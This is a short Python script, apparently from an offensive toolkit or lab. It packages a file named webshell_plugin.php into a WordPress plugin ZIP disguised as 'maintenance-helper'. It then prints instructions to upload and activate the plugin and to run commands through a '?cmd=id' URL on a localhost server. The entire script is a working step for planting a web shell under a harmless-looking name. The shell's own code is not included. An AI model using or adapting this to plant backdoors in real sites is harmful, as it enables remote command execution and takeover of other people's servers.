#!/usr/bin/env python3
"""Packages webshell_plugin.php into a valid WordPress plugin ZIP."""
import zipfile, os

PLUGIN_PHP = os.path.join(os.path.dirname(__file__), 'webshell_plugin.php')
OUT        = os.path.join(os.path.dirname(__file__), 'maintenance-helper.zip')

with zipfile.ZipFile(OUT, 'w', zipfile.ZIP_DEFLATED) as zf:
    zf.write(PLUGIN_PHP, arcname='maintenance-helper/maintenance-helper.php')

print(f'[+] Plugin ZIP: {OUT}')
print(f'    Upload via: WP Admin → Plugins → Add New → Upload Plugin')
print(f'    Activate it, then access:')
print(f'    http://localhost:8080/wp-content/plugins/maintenance-helper/maintenance-helper.php?cmd=id')
